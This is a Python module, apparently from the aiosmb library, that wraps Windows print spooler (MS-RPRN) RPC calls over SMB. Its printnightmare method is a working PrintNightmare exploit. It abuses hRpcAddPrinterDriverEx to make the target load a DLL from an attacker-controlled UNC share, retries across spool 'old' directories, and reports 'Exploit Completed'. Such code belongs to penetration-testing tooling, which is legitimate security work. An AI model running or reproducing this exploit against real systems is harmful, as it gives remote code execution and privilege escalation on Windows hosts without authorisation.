import traceback
from aiosmb.dcerpc.v5.common.connection.smbdcefactory import SMBDCEFactory
from aiosmb.dcerpc.v5 import rprn
from aiosmb.dcerpc.v5.dtypes import RPC_SID
from aiosmb.wintypes.ntstatus import NTStatus
from aiosmb import logger
from aiosmb.dcerpc.v5.dtypes import NULL
from aiosmb.commons.utils.decorators import red, rr, red_gen
import pathlib

class SMBRPRN:
	def __init__(self, connection):
		self.connection = connection
		self.service_manager = None
		
		self.dce = None
		#self.handle = None
		
		self.handle_ctr = 0
		self.printer_handles = {}
		
	async def __aenter__(self):
		return self
		
	async def __aexit__(self, exc_type, exc, traceback):
		await self.close()
		return True,None
	
	@red
	async def connect(self, open = True):
		rpctransport = SMBDCEFactory(self.connection, filename=r'\spoolss')
		self.dce = rpctransport.get_dce_rpc()
		await rr(self.dce.connect())
		await rr(self.dce.bind(rprn.MSRPC_UUID_RPRN))

		return True,None
	
	@red
	async def close(self):
		if self.dce:
			try:
				await self.dce.disconnect()
			except:
				pass
			return
		
		return True,None
	
	@red
	async def open_printer(self, printerName, pDatatype = NULL, pDevModeContainer = NULL, accessRequired = rprn.SERVER_READ):
		resp, _ = await rr(rprn.hRpcOpenPrinter(self.dce, printerName, pDatatype, pDevModeContainer, accessRequired))
		handle_no = self.handle_ctr
		self.handle_ctr += 1
		self.printer_handles[handle_no] = resp['pHandle']

		return handle_no, None
	
	@red
	async def hRpcRemoteFindFirstPrinterChangeNotificationEx(self, handle, fdwFlags, fdwOptions=0, pszLocalMachine=NULL, dwPrinterLocal=0, pOptions=NULL):
		
		handle = self.printer_handles[handle]
		resp, _ = await rr(rprn.hRpcRemoteFindFirstPrinterChangeNotificationEx(
			self.dce, 
			handle, 
			fdwFlags, 
			fdwOptions=fdwOptions,
			pszLocalMachine=pszLocalMachine,
			dwPrinterLocal=dwPrinterLocal, 
			pOptions=pOptions
		))

		return resp, None
	
	async def enum_drivers(self, environments, level = 2, name = ''):
		if environments[-1] != '\x00':
			environments += '\x00'
		drivers, err = await rprn.hRpcEnumPrinterDrivers(self.dce, name, environments, level)
		if err is not None:
			return None, err
		return drivers, None
	
	async def get_driverpath(self, environments = "Windows x64"):
		drivers, err = await self.enum_drivers(environments, level = 2)
		if err is not None:
			return None, err
		
		for driver in drivers:
			DriverPath = str(pathlib.PureWindowsPath(driver.DriverPath).parent) + '\\UNIDRV.DLL'
			print(DriverPath)
			if "FileRepository" in DriverPath:
				return DriverPath, None

		return None, Exception('Failed to obtain driverpath')


	async def printnightmare(self, share, driverpath = None, handle=NULL, environments = "Windows x64", name = "1234"):
		try:
			# share needs to be in UNC format! (\\\\10.0.0.1\\share\\...)
			if driverpath is None:
				driverpath, err = await self.get_driverpath(environments = environments)
				if err is not None:
					return None, err
			if driverpath[-1] != '\x00':
				driverpath += '\x00'
			if environments[-1] != '\x00':
				environments += '\x00'
			if name[-1] != '\x00':
				name += '\x00'

			
			container_info = rprn.DRIVER_CONTAINER()
			container_info['Level'] = 2
			container_info['DriverInfo']['tag'] = 2
			container_info['DriverInfo']['Level2']['cVersion']     = 3
			container_info['DriverInfo']['Level2']['pName']        = name
			container_info['DriverInfo']['Level2']['pEnvironment'] = environments
			container_info['DriverInfo']['Level2']['pDriverPath']  = driverpath
			container_info['DriverInfo']['Level2']['pDataFile']    = "{0}\x00".format(share)
			container_info['DriverInfo']['Level2']['pConfigFile']  = "C:\\Windows\\System32\\winhttp.dll\x00"

			flags = rprn.APD_COPY_ALL_FILES | 0x10 | 0x8000
			filename = share.split("\\")[-1]

			resp, err = await rprn.hRpcAddPrinterDriverEx(self.dce, pName=handle, pDriverContainer=container_info, dwFileCopyFlags=flags)
			if err is not None:
				raise err
			print("[*] Stage0: {0}".format(resp['ErrorCode']))

			container_info['DriverInfo']['Level2']['pConfigFile']  = "C:\\Windows\\System32\\kernelbase.dll\x00"
			for i in range(1, 30):
				try:
					container_info['DriverInfo']['Level2']['pConfigFile'] = "C:\\Windows\\System32\\spool\\drivers\\x64\\3\\old\\{0}\\{1}\x00".format(i, filename)
					resp, err = await rprn.hRpcAddPrinterDriverEx(self.dce, pName=handle, pDriverContainer=container_info, dwFileCopyFlags=flags)
					if err is not None:
						raise err
					print("[*] Stage{0}: {1}".format(i, resp['ErrorCode']))
					if (resp['ErrorCode'] == 0):
						print("[+] Exploit Completed")
						return True, None
				except Exception as e:
					#print(e)
					pass
			return False, None
		except Exception as e:
			traceback.print_exc()
			return None, e